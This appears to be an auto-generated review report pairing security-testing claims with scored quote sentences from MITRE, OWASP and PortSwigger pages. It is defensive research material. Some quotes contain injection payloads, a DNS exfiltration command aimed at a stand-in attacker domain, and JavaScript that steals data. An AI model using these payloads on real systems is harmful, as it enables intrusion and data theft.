# Second-source proposals

Generated from the live candidate pages at `2026-10-28T14:19:34Z`.
These are **quotes to review**, not accepted evidence. A sentence is a
proposal only if it is on the page; whether it supports the claim is a
separate judgement.

## `ad_delegation.prerequisite.delegation-abuse-requires-in-forest-delegation-config`

**Claim:** Delegation abuse is only testable after intra-forest delegation and trust configuration is enumerated, because cross-forest trust presence is not a precondition for it.

### microsoft.com — https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/
status `ACTIVE`, 13458 chars
_No sentence shared enough vocabulary; read the page manually._

### mitre.org — https://attack.mitre.org/techniques/T1134/003/
status `ACTIVE`, 7287 chars
- score 1: GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. [7] Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token. [8] Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command runas . [9]
  - overlap: `configuration`

## `ad_enumeration.evidence.a_single_instance_of_a_native_enumeration_co`

**Claim:** A convincing observation for this class is: The observable that triggers this false positive is one native enumeration command - net user, whoami /all, dsacls, or nltest /domain_trusts - appearing in process command-line telemetry and filed as reconnaissance.

### rfc-editor.org — https://www.rfc-editor.org/rfc/rfc4511.html
status `ACTIVE`, 128402 chars
- score 1: Once the matchingRule and attribute(s) have been determined, the filter item evaluates to TRUE if it matches at least one attribute type or subtype in the entry, FALSE if it does not match any attribute type or subtype in the entry, and Undefined if the matchingRule is not recognized, the matchingRule is unsuitable for use with the specified type, or the assertionValue is invalid.
  - overlap: `false`
- score 1: Copies of IPR disclosures made to the IETF Secretariat and any assurances of licenses to be made available, or the result of an attempt made to obtain a general license or permission for the use of such proprietary rights by implementers or users of this specification can be obtained from the IETF on-line IPR repository at http://www.ietf.org/ipr .
  - overlap: `line`
- score 1: It used to evaluate to FALSE, which caused behavior inconsistent with what most would expect, especially when the 'not' operator was used. - The Filter choice SubstringFilter substrings type is now defined with a lower bound of 1. - The SubstringFilter substrings 'initial, 'any', and 'final' types are now AssertionValue rather than LDAPString.
  - overlap: `false`
- score 1: While individual modifications may violate certain aspects of the directory schema (such as the object class definition and Directory Information Tree (DIT) content rule), the resulting entry after the entire list of modifications is performed MUST conform to the requirements of the directory model and controlling schema [ RFC4512 ].
  - overlap: `class`
- score 1: - If the server does not recognize the control type, determines that it is not appropriate for the operation, or is otherwise unwilling to perform the operation with the control, and if the criticality field is FALSE, the server MUST ignore the control.
  - overlap: `false`

## `ad_enumeration.evidence.ad_enumeration_performed_with_native_windows`

**Claim:** A convincing observation for this class is: The observable that triggers this false positive is AD enumeration performed with native Windows binaries or the ActiveDirectory PowerShell module rather than a purpose-built tool, filed either as malicious module use or as a detection gap because no command-line alert fired.

### mitre.org — https://attack.mitre.org/techniques/T1087/002/
status `ACTIVE`, 26509 chars
- score 10: G0046 FIN7 FIN7 has used the PowerShell script 3CF9.ps1 and the executable WsTaskLoad to enumerate domain administrations by executing net group "Domain Admins" /domain . [31] FIN7 has also used csvde.exe, which is a built-in Windows command line tool, to export Active Directory information.
  - overlap: `built, command, line, powershell, tool, windows`
- score 7: Detection Strategy ID Name Analytic ID Analytic Description DET0129 Domain Account Enumeration Across Platforms AN0363 Adversary enumeration of domain accounts using net.exe, PowerShell, WMI, or LDAP queries from non-domain controllers or non-admin endpoints.
  - overlap: `detection, enumeration, powershell`
- score 5: G1053 Storm-0501 Storm-0501 has utilized an obfuscated version of the Active Directory reconnaissance tool ADRecon.ps1 (obfs.ps1 or recon.ps1) to discover domain accounts. [71]
  - overlap: `tool`
- score 4: G1016 FIN13 FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: GetUserSPNs.vbs and querySpn.vbs . [28] [29]
  - overlap: ``
- score 4: G0049 OilRig OilRig has run net user , net user /domain , net group "domain admins" /domain , and net group "Exchange Trusted Subsystem" /domain to get account listings on a victim. [51]
  - overlap: ``

### rfc-editor.org — https://www.rfc-editor.org/rfc/rfc4511.html
status `ACTIVE`, 128402 chars
- score 2: It used to evaluate to FALSE, which caused behavior inconsistent with what most would expect, especially when the 'not' operator was used. - The Filter choice SubstringFilter substrings type is now defined with a lower bound of 1. - The SubstringFilter substrings 'initial, 'any', and 'final' types are now AssertionValue rather than LDAPString.
  - overlap: `false, rather`
- score 2: While individual modifications may violate certain aspects of the directory schema (such as the object class definition and Directory Information Tree (DIT) content rule), the resulting entry after the entire list of modifications is performed MUST conform to the requirements of the directory model and controlling schema [ RFC4512 ].
  - overlap: `class, performed`
- score 2: Either the client or server MAY remove the TLS layer and leave the LDAP message layer intact by sending and receiving a TLS closure alert.
  - overlap: `alert, either`
- score 1: This document and the information contained herein are provided on an "AS IS" basis and THE CONTRIBUTOR, THE ORGANIZATION HE/SHE REPRESENTS OR IS SPONSORED BY (IF ANY), THE INTERNET SOCIETY AND THE INTERNET ENGINEERING TASK FORCE DISCLAIM ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO ANY WARRANTY THAT THE USE OF THE INFORMATION HEREIN WILL NOT INFRINGE ANY RIGHTS OR ANY IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.
  - overlap: `purpose`
- score 1: Once the matchingRule and attribute(s) have been determined, the filter item evaluates to TRUE if it matches at least one attribute type or subtype in the entry, FALSE if it does not match any attribute type or subtype in the entry, and Undefined if the matchingRule is not recognized, the matchingRule is unsuitable for use with the specified type, or the assertionValue is invalid.
  - overlap: `false`

## `ad_enumeration.evidence.reject_a_ad_enumeration_finding_until_it_is`

**Claim:** A convincing observation for this class is: Adjacent behaviour that produces the same observable result: Domain account names, group memberships and privilege are discoverable through LDAP with an ordinary domain credential, so a single low-privilege login yields the target list that every later password attack or lateral move is aimed at.

### rfc-editor.org — https://www.rfc-editor.org/rfc/rfc4511.html
status `ACTIVE`, 128402 chars
- score 2: While individual modifications may violate certain aspects of the directory schema (such as the object class definition and Directory Information Tree (DIT) content rule), the resulting entry after the entire list of modifications is performed MUST conform to the requirements of the directory model and controlling schema [ RFC4512 ].
  - overlap: `class, list`
- score 2: Note that an X.500 "list"-like operation can be emulated by the client requesting a singleLevel Search operation with a filter checking for the presence of the 'objectClass' attribute, and that an X.500 "read"-like operation can be emulated by a baseObject Search operation with the same filter.
  - overlap: `list, same`
- score 2: For certain result codes (typically, but not restricted to noSuchObject, aliasProblem, invalidDNSyntax, and aliasDereferencingProblem), the matchedDN field is set (subject to access controls) to the name of the last entry (object or alias) used in finding the target (or base) object.
  - overlap: `result, target`
- score 2: This message is intended to be used in conjunction with the Extended operation to define new single-request/multiple-response operations or in conjunction with a control when extending existing LDAP operations in a way that requires them to return Intermediate response information.
  - overlap: `ldap, single`
- score 2: A client MUST NOT send a request with the same messageID as an earlier request in the same LDAP session unless it can be determined that the server is no longer servicing the earlier request (e.g., after the final response is received, or a subsequent Bind completes).
  - overlap: `ldap, same`

## `ad_enumeration.fp_rule.admin_enumeration_command_is_dual_use`

**Claim:** A single instance of a native enumeration command (net user, whoami /all, dsacls, nltest /domain_trusts) from a workstation is a dual-use tool and not a finding on its own; the signal is a CLUSTER of these commands inside a short window from one process tree, because each individual command is a documented day-one administration action.

### rfc-editor.org — https://www.rfc-editor.org/rfc/rfc4511.html
status `ACTIVE`, 128402 chars
- score 2: While individual modifications may violate certain aspects of the directory schema (such as the object class definition and Directory Information Tree (DIT) content rule), the resulting entry after the entire list of modifications is performed MUST conform to the requirements of the directory model and controlling schema [ RFC4512 ].
  - overlap: `individual, tree`
- score 2: The server then proceeds to authenticate the client in either a single-step or multi-step Bind process.
  - overlap: `process, single`
- score 1: For certain result codes (typically, but not restricted to noSuchObject, aliasProblem, invalidDNSyntax, and aliasDereferencingProblem), the matchedDN field is set (subject to access controls) to the name of the last entry (object or alias) used in finding the target (or base) object.
  - overlap: `finding`
- score 1: This message is intended to be used in conjunction with the Extended operation to define new single-request/multiple-response operations or in conjunction with a control when extending existing LDAP operations in a way that requires them to return Intermediate response information.
  - overlap: `single`
- score 1: If the server's schema defines short names [ RFC4512 ] for an attribute type, then the server SHOULD use one of those names in attribute descriptions for that attribute type (in preference to using the [ RFC4512 ] format of the attribute type's object identifier).
  - overlap: `short`

## `api_trust.test.audience_bound_token_replay_requires_a_sibling_api_returning_its_own_data_for_a_foreign_audience`

**Claim:** A sibling API that does not validate audience is proved by replaying a token minted for API A against API B and reading a B response body that only B holds, which cannot happen unless B accepted a token whose aud names a different service.

### mitre.org — https://cwe.mitre.org/data/definitions/918.html
status `ACTIVE`, 25126 chars
- score 3: (good code) Example Language: PHP # Define allowed URLs (or domains) $allowed_urls = [ 'https://example.com/data.json', 'https://api.example.com/info', ]; # Get the user-provided URL $url = $_GET['url'] ?? ''; # Validate against allowed URLs if (!in_array($url, $allowed_urls)) { http_response_code(400); echo "Invalid or unauthorized URL."; exit; } # Fetch content safely $response = @file_get_contents($url); if ($response === false) { http_response_code(500); echo "Failed to fetch content."; exit; } echo htmlspecialchars($response); # Escape output for safety
  - overlap: `against, response, validate`
- score 1: Reference Description CVE-2026-33626 SSRF in LLM toolkit accesses arbitrary URLs for images, as exploited in the wild in April 2026 to conduct port scanning [ REF-1519 ] CVE-2024-3095 SSRF in LLM application development framework because the URL retriever allows connections to local addresses using a crafted Location header CVE-2023-32786 Chain: LLM integration framework has prompt injection ( CWE-1427 ) that allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF ( CWE-918 ) and potentially injecting content into downstream tasks.
  - overlap: `service`
- score 1: (bad code) Example Language: PHP $url = $_GET['url']; # User-controlled input # Fetch the content of the provided URL $response = file_get_contents($url); echo $response; The given PHP code is vulnerable to Server-Side Request Forgery (SSRF) because it directly accepts a user-supplied URL from the $_GET['url'] parameter and fetches its content using file_get_contents(), without any validation or restrictions.
  - overlap: `response`
- score 1: For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.
  - overlap: `different`
- score 1: Modes Of Introduction The different Modes of Introduction provide information about how and when this weakness may be introduced.
  - overlap: `different`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Microservices_Security_Cheat_Sheet.html
status `ACTIVE`, 22579 chars
- score 5: Service-to-service authentication ¶ Existing patterns ¶ Mutual transport layer security ¶ With an mTLS approach, each microservice can legitimately identify who it talks to, in addition to achieving confidentiality and integrity of the transmitted data.
  - overlap: `service`
- score 4: Table of contents Introduction Edge-level authorization Service-level authorization External Entity Identity Propagation Service-to-service authentication Existing patterns Mutual transport layer security Token-based Logging References
  - overlap: `service, token`
- score 4: Table of contents Introduction Edge-level authorization Service-level authorization External Entity Identity Propagation Service-to-service authentication Existing patterns Mutual transport layer security Token-based Logging References
  - overlap: `service, token`
- score 3: For a comprehensive overview of events that should be logged and possible data format, please see the OWASP Logging Cheat Sheet and Application Logging Vocabulary Cheat Sheet References ¶ NIST SP 800-204: Security Strategies for Microservices-Based Application Systems NIST SP 800-204A: Building Secure Microservices-Based Applications Using Service-Mesh Architecture
  - overlap: `service`
- score 3: Choose token validation based on the required revocation response time, token lifetime, and availability requirements: Online validation: The microservice queries the token service.
  - overlap: `response, service, token`

### portswigger.net — https://portswigger.net/web-security/api-testing
status `ACTIVE`, 19483 chars
- score 2: We'll also teach you how to test for server-side parameter pollution vulnerabilities that may impact internal APIs.
  - overlap: ``
- score 2: Validate that the content type is expected for each request or response.
  - overlap: `response, validate`
- score 1: Academy home Dashboard Learning paths Latest topics Request smuggling Web cache deception Web LLM attacks API testing NoSQL injection View all topics All content All labs All topics Mystery labs Hall of Fame Leaderboard Interview - Kamil Vavra Interview - Johnny Villarreal Interview - Andres Rauschecker Get started Get certified Get certified How to prepare How it works Practice exam Exam hints and guidance What the exam involves FAQs Validate your certification
  - overlap: `validate`
- score 1: Burp includes numerous tools that can help you identify hidden parameters: Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters.
  - overlap: `names`
- score 1: Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.
  - overlap: `names`

## `authn.prerequisite.canonicalization-agreement-failure`

**Claim:** SAML assertions fail to verify when the service provider and identity provider disagree on XML canonicalization, because the hashed byte representation of the same logical content then differs.

### mitre.org — https://cwe.mitre.org/data/definitions/287.html
status `ACTIVE`, 43126 chars
- score 7: CVE-2022-35248 Chat application skips validation when Central Authentication Service (CAS) is enabled, effectively removing the second factor from two-factor authentication CVE-2022-36436 Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.
  - overlap: `service`
- score 6: CVE-2017-14623 LDAP Go package allows authentication bypass using an empty password, causing an unauthenticated LDAP bind CVE-2009-3421 login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.
  - overlap: ``
- score 4: CVE-2021-35033 Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port CVE-2020-10263 Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access CVE-2020-13927 Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.
  - overlap: ``
- score 4: CVE-2009-3231 use of LDAP authentication with anonymous binds causes empty password to result in successful authentication CVE-2005-3435 product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.
  - overlap: ``
- score 4: If not, the code performs authentication with the user-provided username and password.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/authentication
status `ACTIVE`, 13503 chars
- score 10: We will look more closely at some of the most common vulnerabilities in the following areas: Vulnerabilities in password-based login LABS Vulnerabilities in multi-factor authentication LABS Vulnerabilities in other authentication mechanisms LABS Several of the labs require you to enumerate usernames and brute-force passwords.
  - overlap: ``
- score 4: To help you with this process, we provide a shortlist of candidate usernames and passwords that you should use to solve the labs.
  - overlap: ``
- score 4: There are three main types of authentication: Something you know , such as a password or the answer to a security question.
  - overlap: ``
- score 3: Most vulnerabilities in authentication mechanisms occur in one of two ways: The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
  - overlap: `fail`
- score 3: For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.
  - overlap: `same`

## `cmd.tech.injection-surface-can-be-a-request-header-not-a-body-parameter`

**Claim:** An injection surface living in an HTTP request HEADER rather than a body parameter is missed by body-focused scanners entirely, so a body-only pass reports clean on a host that is executing attacker-supplied commands.

### mitre.org — https://cwe.mitre.org/data/definitions/78.html
status `ACTIVE`, 57718 chars
- score 10: Taxonomy Mappings Mapped Taxonomy Name Node ID Fit Mapped Node Name PLOVER OS Command Injection OWASP Top Ten 2007 A3 CWE More Specific Malicious File Execution OWASP Top Ten 2004 A6 CWE More Specific Injection Flaws CERT C Secure Coding ENV03-C Sanitize the environment when invoking external programs CERT C Secure Coding ENV33-C CWE More Specific Do not call system() CERT C Secure Coding STR02-C Sanitize data passed to complex subsystems WASC 31 OS Commanding The CERT Oracle Secure Coding Standard for Java (2011) IDS07-J Do not pass untrusted, unsanitized data to the Runtime.exec() method Software Fault Patterns SFP24 Tainted input to command OMG ASCSM ASCSM-CWE-78
  - overlap: `injection, pass`
- score 9: (bad code) Example Language: Perl sub GetUntrustedInput { return($ARGV[0]); } sub encode { my($str) = @_; $str =~ s/\&/\&/gs; $str =~ s/\"/\"/gs; $str =~ s/\'/\'/gs; $str =~ s/\ $str =~ s/\>/\>/gs; return($str); } sub doit { my $uname = encode(GetUntrustedInput("username")); print " Welcome, $uname! \n"; system("cd /home/$uname; /bin/ls -l"); } The programmer attempts to encode dangerous characters, however the denylist for encoding is incomplete ( CWE-184 ) and an attacker can still pass a semicolon, resulting in a chain with OS command injection ( CWE-78 ).
  - overlap: `attacker, injection, pass`
- score 8: CVE-2008-4796 OS command injection through https:// URLs CVE-2007-3572 Chain: incomplete denylist for OS command injection CVE-2012-1988 Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.
  - overlap: `commands, injection`
- score 7: Alternate Terms Shell injection Shell metacharacters OS Command Injection
  - overlap: `injection`
- score 6: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `injection, reports`

### portswigger.net — https://portswigger.net/web-security/os-command-injection
status `ACTIVE`, 15627 chars
- score 9: The out-of-band channel provides an easy way to exfiltrate the output from injected commands: & nslookup `whoami`.kgji2ohoyw.web-attacker.com & This causes a DNS lookup to the attacker's domain containing the result of the whoami command: wwwuser.kgji2ohoyw.web-attacker.com Ways of injecting OS commands You can use a number of shell metacharacters to perform OS command injection attacks.
  - overlap: `attacker, commands, injection`
- score 8: Below is a summary of some commands that are useful on Linux and Windows platforms: Purpose of command Linux Windows Name of current user whoami whoami Operating system uname -a ver Network configuration ifconfig ipconfig /all Network connections netstat -an netstat -an Running processes ps -ef tasklist Blind OS command injection vulnerabilities Many instances of OS command injection are blind vulnerabilities.
  - overlap: `commands, injection`
- score 8: The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command: & echo aiwefwlguh & If this input is submitted in the productID parameter, the command executed by the application is: stockreport.pl & echo aiwefwlguh & 29 The echo command causes the supplied string to be echoed in the output.
  - overlap: `attacker, injection, parameter, supplied`
- score 8: Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
  - overlap: `attacker, injection`
- score 8: Useful commands After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system.
  - overlap: `commands, injection`

## `deser.test.a_serialized_blob_whose_integrity_check_you_coul`

**Claim:** To decide this case, observe: Discard the report when your tampered payload was rejected at the integrity or signature layer, since a deserializer never saw the attacker-controlled bytes and the gadget chain was never reached.

### mitre.org — https://cwe.mitre.org/data/definitions/502.html
status `ACTIVE`, 35792 chars
- score 5: Reference Description CVE-2024-37052 insecure deserialization in platform for managing AI/ML applications and models allows code execution via a crafted pickled object in a model file CVE-2024-37288 deserialization of untrusted YAML data in dashboard for data query and visualization of Elasticsearch data CVE-2024-9314 PHP object injection in WordPress plugin for AI-based SEO CVE-2019-12799 chain: bypass of untrusted deserialization issue ( CWE-502 ) by using an assumed-trusted class ( CWE-183 ) CVE-2015-8103 Deserialization issue in commonly-used Java library allows remote execution.
  - overlap: `chain`
- score 4: An example of this is: (good code) Example Language: Java private final void readObject(ObjectInputStream in) throws java.io.IOException { throw new java.io.IOException("Cannot be deserialized"); } Example 2 In Python, the Pickle library handles the serialization and deserialization processes.
  - overlap: ``
- score 4: Implementation Avoid having unnecessary types or gadgets (a sequence of instances and method invocations that can self-execute during the deserialization process, often found in libraries) available that can be leveraged for malicious ends.
  - overlap: ``
- score 4: 2011-03-20. https://blog.nelhage.com/2011/03/exploiting-pickle/ >. [REF-468] Chris Frohoff. "Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization".
  - overlap: ``
- score 4: Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.
  - overlap: `attacker, since`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
status `ACTIVE`, 33445 chars
- score 8: Serializable Opaque-box Review ¶ If the captured traffic data includes the following patterns, it may suggest that the data was sent in Java serialization streams: AC ED 00 05 in Hex rO0 in Base64 Content-type header of an HTTP response set to application/x-java-serialized-object Prevent Data Leakage and Trusted Field Clobbering ¶ If there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as the transient keyword (section Protecting Sensitive Information ).
  - overlap: `controlled, never`
- score 5: Java De-serialization toolkits Java de-serialization tool .Net payload generator Burp Suite extension Java secure deserialization library Serianalyzer is a static bytecode analyzer for deserialization Payload generator Android Java Deserialization Vulnerability Tester Burp Suite Extension JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active References ¶ Oracle Java 17: Serialization Filtering Microsoft: Deserialization Risks in Use of BinaryFormatter and Related Types Python: pickle Security Warning
  - overlap: `payload`
- score 4: Table of contents Introduction What is Deserialization Guidance on Deserializing Objects Safely PHP Clear-box Review Python Opaque-box Review Clear-box Review Java Clear-box Review Opaque-box Review Prevent Data Leakage and Trusted Field Clobbering Prevent Deserialization of Domain Objects Harden Your Own java.io.ObjectInputStream Harden All java.io.ObjectInputStream Usage with an Agent Other Deserialization Libraries and Formats .Net CSharp Clear-box Review Opaque-box Review General Precautions Known .NET RCE Gadgets Language-Agnostic Methods for Deserializing Safely Using Alternative Data Formats Only Deserialize Signed Data Mitigation Tools/Libraries Detection Tools References
  - overlap: ``
- score 4: Table of contents Introduction What is Deserialization Guidance on Deserializing Objects Safely PHP Clear-box Review Python Opaque-box Review Clear-box Review Java Clear-box Review Opaque-box Review Prevent Data Leakage and Trusted Field Clobbering Prevent Deserialization of Domain Objects Harden Your Own java.io.ObjectInputStream Harden All java.io.ObjectInputStream Usage with an Agent Other Deserialization Libraries and Formats .Net CSharp Clear-box Review Opaque-box Review General Precautions Known .NET RCE Gadgets Language-Agnostic Methods for Deserializing Safely Using Alternative Data Formats Only Deserialize Signed Data Mitigation Tools/Libraries Detection Tools References
  - overlap: ``
- score 4: Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/deserialization
status `ACTIVE`, 15125 chars
- score 9: How vulnerabilities arise Impact Identifying PHP serialization format Java serialization format Exploiting Manipulating serialized objects Object attributes Data types Using application functionality Magic methods Injecting arbitrary objects Gadget chains Pre-built gadget chains Documented gadget chains Creating your own exploit PHAR deserialization Memory corruption Preventing vulnerabilities Web Security Academy Insecure deserialization Insecure deserialization In this section, we'll cover what insecure deserialization is and describe how it can potentially expose websites to high-severity attacks.
  - overlap: `gadget`
- score 5: Finally, remember that the vulnerability is the deserialization of user input, not the presence of gadget chains that subsequently handle the data.
  - overlap: `gadget`
- score 3: However, while it may require more effort, it is just as possible for an attacker to exploit binary serialized objects as it is to exploit string-based formats.
  - overlap: `attacker`
- score 3: This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
  - overlap: `attacker`
- score 3: Don't rely on trying to eliminate gadget chains that you identify during testing.
  - overlap: `gadget`

## `graphql.signal.node_global_ids`

**Claim:** A node(id:) or nodes(ids:) field on the root Query type means any object can be fetched by global ID without traversing its parent resolver.

### mitre.org — https://cwe.mitre.org/data/definitions/749.html
status `ACTIVE`, 24686 chars
- score 1: CWE-749: Exposed Dangerous Method or Function (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `root`
- score 1: UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.
  - overlap: `query`
- score 1: For example, if the application has permission to send text messages: (attack code) Example Language: JavaScript userInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null); This malicious script can use the userInfoObject object to load the SmsManager object and send arbitrary text messages to any recipient.
  - overlap: `object`
- score 1: Even malicious iframes loaded within a trusted page may access the exposed interface: (attack code) Example Language: JavaScript var info = window.userInfoObject.getUserInfo(); sendUserInfo(info); This malicious code within an iframe is able to access the interface object and steal the user's data.
  - overlap: `object`
- score 1: 782 Exposed IOCTL with Insufficient Access Control Relevant to the view "Software Development" (View-699) Nature Type ID Name MemberOf Category - a CWE entry that contains a set of other entries that share a common characteristic.
  - overlap: `type`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
status `ACTIVE`, 36974 chars
- score 5: NO_INTROSPECTION_FIELD_VISIBILITY ) . build (); Disable Introspection & GraphiQL - JavaScript For existing applications using the deprecated express-graphql middleware , this illustration assumes NoIntrospection is an imported introspection-denying validation rule.
  - overlap: `field`
- score 4: Here is an example of a GraphQL query with depth N: query evil { # Depth : 0 album ( id : 42 ) { # Depth : 1 songs { # Depth : 2 album { # Depth : 3 ... # Depth : ... album { id : N } # Depth : N } } } } Here is an example of a GraphQL query requesting 99999999 of an object: query { author ( id : "abc" ) { posts ( first : 99999999 ) { title } } } Timeouts ¶ Adding timeouts can be a simple way to limit how many resources any single request can consume.
  - overlap: `object, query`
- score 4: You can check whether your schema has these fields by running this on the command-line (assuming that schema.json contains your GraphQL schema): cat schema.json | jq ".data.__schema.types[] | select(.name==\"Query\") | .fields[] | .name" | grep node .
  - overlap: `node, query`
- score 4: Suggestion of mis-typed fields if the introspection is disabled Introspection + GraphiQL ¶ GraphQL Often comes by default with introspection and/or GraphiQL enabled and not requiring authentication.
  - overlap: ``
- score 4: You should consider disabling this feature if you have disabled the introspection, to decrease the exposure, but not all implementations of GraphQL support doing so.
  - overlap: ``

## `graphql.validation.a_shallow_query_can_still_be_a_dos_and_depth_only_checks_prove_nothing`

**Claim:** A resource-exhaustion finding in GraphQL needs evidence of backend cost, and depth limiting is not the control being tested - a shallow operation with a hundred aliases or a batch array can amplify load just as effectively.

### mitre.org — https://cwe.mitre.org/data/definitions/749.html
status `ACTIVE`, 24686 chars
- score 1: For example, if the application has permission to send text messages: (attack code) Example Language: JavaScript userInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null); This malicious script can use the userInfoObject object to load the SmsManager object and send arbitrary text messages to any recipient.
  - overlap: `load`
- score 1: Impact Details Gain Privileges or Assume Identity; Read Application Data; Modify Application Data; Execute Unauthorized Code or Commands; Other Scope: Integrity, Confidentiality, Availability, Access Control, Other Exposing critical functionality essentially provides an attacker with the privilege level of the exposed functionality.
  - overlap: `control`
- score 1: Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.) Effectiveness: High
  - overlap: `control`
- score 1: Vulnerability Mapping : ALLOWED This CWE ID may be used to map to real-world vulnerabilities Abstraction: Base Base - a weakness that is still mostly independent of a resource or technology, but with sufficient details to provide specific methods for detection and prevention.
  - overlap: `resource`
- score 1: ( URL validated: 2023-04-07 ) [REF-510] Microsoft. "How to stop an ActiveX control from running in Internet Explorer". https://support.microsoft.com/en-us/help/240797/how-to-stop-an-activex-control-from-running-in-internet-explorer >.
  - overlap: `control`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
status `ACTIVE`, 36974 chars
- score 7: Table of contents Introduction Common Attacks Best Practices and Recommendations Input Validation General Practices Injection Prevention Process Validation DoS Prevention Query Limiting (Depth & Amount) Timeouts Query Cost Analysis Rate Limiting Server-side Batching and Caching System Resource Management Access Control General Data Access Query Access (Data Fetching) Mutation Access (Data Manipulation) Batching Attacks Mitigating Batching Attacks Secure Configurations Introspection + GraphiQL Don't Return Excessive Errors References
  - overlap: `control, cost, depth, limiting, resource`
- score 7: Table of contents Introduction Common Attacks Best Practices and Recommendations Input Validation General Practices Injection Prevention Process Validation DoS Prevention Query Limiting (Depth & Amount) Timeouts Query Cost Analysis Rate Limiting Server-side Batching and Caching System Resource Management Access Control General Data Access Query Access (Data Fetching) Mutation Access (Data Manipulation) Batching Attacks Mitigating Batching Attacks Secure Configurations Introspection + GraphiQL Don't Return Excessive Errors References
  - overlap: `control, cost, depth, limiting, resource`
- score 5: NO_INTROSPECTION_FIELD_VISIBILITY ) . build (); Disable Introspection & GraphiQL - JavaScript For existing applications using the deprecated express-graphql middleware , this illustration assumes NoIntrospection is an imported introspection-denying validation rule.
  - overlap: `graphql`
- score 5: Suggestion of mis-typed fields if the introspection is disabled Introspection + GraphiQL ¶ GraphQL Often comes by default with introspection and/or GraphiQL enabled and not requiring authentication.
  - overlap: `graphql`
- score 5: You should consider disabling this feature if you have disabled the introspection, to decrease the exposure, but not all implementations of GraphQL support doing so.
  - overlap: `graphql`

### portswigger.net — https://portswigger.net/web-security/graphql
status `ACTIVE`, 24592 chars
- score 5: Preventing GraphQL attacks To prevent many common GraphQL attacks, take the following steps when you deploy your API to production: If your API is not intended for use by the general public, disable introspection on it.
  - overlap: `graphql`
- score 5: Bypassing GraphQL introspection defenses If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.
  - overlap: `graphql`
- score 5: Clairvoyance is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled.
  - overlap: `graphql`
- score 5: Bypassing rate limiting using aliases Ordinarily, GraphQL objects can't contain multiple properties with the same name.
  - overlap: `aliases, graphql, limiting`
- score 5: Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.
  - overlap: `graphql`

## `idor.technique.nested_child_refs_and_graphql_node_ids`

